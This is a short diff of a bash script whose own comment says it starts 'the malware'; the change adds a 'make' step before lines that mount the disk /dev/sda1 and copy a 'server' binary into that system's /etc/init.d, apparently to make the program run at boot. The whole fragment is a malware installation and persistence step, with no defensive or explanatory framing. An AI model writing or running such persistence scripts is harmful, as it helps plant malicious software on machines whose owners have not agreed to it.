@@ -1,6 +1,7 @@
 #!/bin/bash
 # This script is used to start the malware
 
+make
 mkdir folder
 mount /dev/sda1 folder
 cp server folder/etc/init.d
